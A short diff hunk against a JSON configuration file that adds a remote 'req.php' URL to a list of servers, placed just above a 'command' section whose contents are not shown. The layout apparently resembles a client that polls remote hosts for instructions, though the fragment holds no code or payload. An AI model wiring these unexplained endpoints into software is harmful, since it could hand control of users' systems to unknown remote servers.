@@ -32,6 +32,7 @@
 
     },
     "servers" :{
+        "server1" : "http://ababil.ywc.pw/req.php",
         "server2" : "http://ababilbd.c1.biz/req.php"
     },
     "command":{
